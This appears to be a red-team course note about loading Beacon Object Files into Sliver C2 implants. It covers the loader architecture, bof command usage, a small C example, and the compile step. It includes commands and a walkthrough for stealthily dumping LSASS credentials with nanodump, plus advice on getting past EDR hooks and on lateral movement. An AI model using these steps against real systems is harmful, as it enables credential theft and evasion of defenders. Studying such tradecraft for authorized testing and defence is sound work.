---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.10 Integrating BOFs Beacon Object Files in Sliver"
---

# 95.10 Integrating BOFs Beacon Object Files in Sliver

## Introduction to Beacon Object Files (BOFs)

A critical evolution in post-exploitation OPSEC has been the shift away from .NET assemblies toward **Beacon Object Files (BOFs)**. Originally popularized by Cobalt Strike, a BOF is a compiled C program that has not been linked. It exists as a raw `.o` (object) file. 

Instead of relying on the operating system to link and load an executable, the C2 implant (such as Sliver) contains a miniature linker. When instructed, the implant loads the BOF into its own memory space, resolves the necessary Windows API imports on the fly, and executes it. 

### Advantages of BOFs Over Traditional Executables and .NET
- **Tiny Footprint:** BOFs are extremely small (often a few kilobytes) compared to statically compiled Golang binaries or full .NET assemblies.
- **No CLR Required:** Unlike `execute-assembly`, BOFs do not require loading the .NET Common Language Runtime, thereby avoiding AMSI and ETW logging associated with .NET reflection.
- **In-Process Execution:** They run inside the implant's process, avoiding process creation telemetry (unless specifically designed to spawn a process).
- **Stealth:** Since they aren't fully linked PE files, they are difficult for AV engines to signature accurately on disk or in transit.

## BOF Execution Architecture

Below is an ASCII representation of the BOF lifecycle and execution flow within Sliver.

```text
    [ Operator / Sliver Client ]
                  |
                  | 1. Execute Command (e.g., 'bof whoami')
                  | 2. Sliver Client parses BOF, packs arguments
                  v
+---------------------------------------------------+
|               Sliver C2 Server                    |
|  (Transmits raw .o file and packed args via C2)   |
+---------------------------------------------------+
                  |
                  | Encrypted Tunnel (MTLS / WG)
                  v
+---------------------------------------------------+
|               Sliver Implant (Target)             |
|                                                   |
|  [a] Receive Object File (.o) bytes               |
|                                                   |
|  [b] BOF Loader / Linker Initialization           |
|      - Parses COFF headers                        |
|      - Allocates RW memory for code/data          |
|                                                   |
|  [c] Symbol Resolution                            |
|      - Resolves Beacon API functions              |
|        (e.g., BeaconPrintf)                       |
|      - Resolves Dynamic API calls                 |
|        (e.g., KERNEL32$VirtualAlloc)              |
|                                                   |
|  [d] Memory Protection & Execution                |
|      - Changes permissions to RX                  |
|      - Creates Thread / executes entry point      |
|                                                   |
|  [e] Output Collection                            |
|      - Captures BeaconPrintf output               |
|      - Sends output back to Server                |
+---------------------------------------------------+
```

## Integrating and Executing BOFs in Sliver

Sliver supports standard Cobalt Strike BOFs out of the box. Many popular BOFs are available via the Sliver Armory (see [[07 - Sliver Armory Installing Custom Extensions]]), but you can also load custom BOFs directly.

### 1. Manual BOF Execution
If you have compiled a `.o` file locally, you can execute it dynamically using the `bof` command.

```bash
# Execute a local BOF and pass string arguments
sliver (IMPLANT) > bof /path/to/my_custom_bof.o --args "argument1" "argument2"
```

### 2. Passing Complex Arguments
Sliver allows passing complex arguments, matching the packing structures required by the Beacon API.
Formats supported: `i` (integer), `s` (string), `z` (wide string), `b` (byte array).

```bash
# Passing an integer and a wide string to a BOF
sliver (IMPLANT) > bof /opt/bofs/query_reg.o --arg-type i 1 --arg-type z "HKLM\\Software"
```

### 3. Using Armory for BOFs
The most efficient way to use BOFs is via Armory, which wraps the complexity of arguments.
```bash
sliver > armory install nanodump
sliver (IMPLANT) > nanodump --write C:\Windows\Temp\lsass.dmp
```

## Developing Custom BOFs for Sliver

Creating a custom BOF requires understanding the Beacon API. You must include the `beacon.h` header file provided by the C2 framework.

**Basic BOF Example in C:**
```c
#include <windows.h>
#include "beacon.h"

// Declaration for dynamic API resolution
// Format: LIBRARY$Function
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);

// The mandatory entry point for BOFs
void go(char* args, int alen) {
    DWORD pid = KERNEL32$GetCurrentProcessId();
    
    // BeaconPrintf is used to send output back to the C2 server
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Current Process ID: %d\n", pid);
}
```

**Compiling the BOF (using MinGW on Linux):**
```bash
x86_64-w64-mingw32-gcc -c bof_example.c -o bof_example.o
```

## BOF OpSec and Memory Considerations

While BOFs are incredibly stealthy, they introduce specific risks:

1. **Process Crashing:** Because a BOF runs *inside* the implant's process, an unhandled exception (like a segmentation fault or null pointer dereference) in the BOF will crash the entire Sliver implant. Thoroughly test custom BOFs before deployment.
2. **Memory Footprint:** The implant allocates memory to load the BOF. If this memory is not cleaned up or is left as RWX, memory scanners (like Moneta or PE-Sieve) may flag the implant. Modern implementations strive to allocate memory as RW, change to RX for execution, and clean up post-execution.
3. **API Hooking:** Just because it's a BOF doesn't mean it bypasses EDR API hooks. If the BOF calls `OpenProcess` on `lsass.exe`, the EDR's user-land hook in `ntdll.dll` will still catch it. To bypass this, BOFs should implement Indirect Syscalls or utilize API unhooking before executing sensitive actions.

## Real-World Attack Scenario

### Stealthy LSASS Dumping
An operator needs to dump credentials from a highly monitored Windows Server. Using tools like Mimikatz or a PowerShell script is guaranteed to generate alerts.

1. The operator decides to use `Nanodump`, a BOF specifically designed for stealthy LSASS dumping.
2. Instead of dropping an executable, the operator runs the BOF via Sliver: `nanodump --pid <lsass_pid> --use-seclogon --write C:\Windows\Temp\log.txt`
3. Sliver streams the `nanodump.o` object file directly into the implant's memory.
4. The Sliver linker resolves the APIs. To evade API hooking, `Nanodump` is designed to use System Calls internally.
5. The BOF uses the `Seclogon` service to duplicate the LSASS handle stealthily, writes the dump to disk masquerading as a text file, and cleans up its memory.
6. The operator downloads the dump file and extracts credentials offline, completely bypassing the EDR's behavioral heuristics.

## Chaining Opportunities

- **Evasion Hooks:** Run a custom BOF to unhook `ntdll.dll` inside the implant process, paving the way for noisy module execution (see [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]]).
- **Lateral Movement:** Use BOFs like `WmiExec-BOF` or `SCManager-BOF` to interact with remote services directly through the implant without spawning `cmd.exe` or PowerShell (see [[09 - Sliver Lateral Movement PsExec WMI]]).
- **Armory Integration:** Package your custom OPSEC BOFs into the Sliver Armory for rapid deployment across the team (see [[07 - Sliver Armory Installing Custom Extensions]]).

## Related Notes

- [[05 - Sliver Session Management and Post-Exploitation]]
- [[07 - Sliver Armory Installing Custom Extensions]]
- [[08 - Evasion Techniques in Sliver Process Hollowing BlockDLLs]]
- [[09 - Sliver Lateral Movement PsExec WMI]]
- [[15 - Writing Custom Beacon Object Files for Red Teaming]]
